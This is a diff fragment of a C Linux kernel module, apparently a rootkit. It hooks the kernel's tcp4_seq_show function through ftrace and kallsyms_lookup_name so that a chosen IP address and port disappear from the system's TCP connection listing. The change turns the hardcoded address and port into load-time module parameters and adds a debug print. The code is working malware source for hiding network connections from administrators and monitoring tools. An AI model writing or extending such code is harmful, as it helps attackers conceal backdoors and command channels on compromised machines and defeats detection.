@@ -8,14 +8,16 @@
 void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
 
 // Types & other consts.
+static char *ip_to_hide;
+module_param(ip_to_hide, charp, 0);
+
+static int port_to_hide;
+module_param(port_to_hide, int, 0);
+
 typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static unsigned long tcp4_seq_show_address; 
 static original_tcp4_seq_show_t original_tcp4_seq_ptr;
 static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY};
-
-static char *ip_to_hide = "0.0.0.0";
-static int port_to_hide = 8000;
- 
 
 char * ipaddr_to_string(__be32 ipaddr)
 {
@@ -58,6 +60,8 @@ void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftr
 }
  
 int load(void) {
+    printk(KERN_ALERT "%s:%d", ip_to_hide, port_to_hide);
+
     printk(KERN_ALERT "Initializing...");
     tcp4_seq_show_address = kallsyms_lookup_name("tcp4_seq_show");
     if (!tcp4_seq_show_address) {
